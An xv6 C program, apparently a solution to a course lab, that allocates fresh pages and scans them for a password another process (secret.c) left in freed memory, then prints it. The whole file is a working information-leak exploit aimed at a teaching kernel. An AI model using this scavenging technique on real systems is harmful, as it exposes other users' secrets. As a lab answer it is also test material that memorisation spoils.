#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // 分配32个页面的内存，与secret.c相同
  char *mem = sbrk(PGSIZE * 32);
  
  // secret.c中的标识字符串
  char *pattern = "my very very very secret pw is:   ";
  int pattern_len = 35;  // strlen(pattern)
  
  // 搜索所有分配的内存
  for (int i = 0; i < PGSIZE * 32 - pattern_len - 8; i++) {
    // 检查是否找到标识字符串
    if (memcmp(mem + i, pattern, pattern_len) == 0) {
      // 找到了！密码就在标识字符串后面
      write(2, mem + i + pattern_len, 8);
      exit(0);
    }
  }
  
  // 如果简单搜索没找到，尝试直接访问secret.c使用的位置
  // secret.c: end = end + 9 * PGSIZE; strcpy(end+32, argv[1]);
  char *secret_location = mem + 9 * PGSIZE + 32;
  write(2, secret_location, 8);
  
  exit(0);
}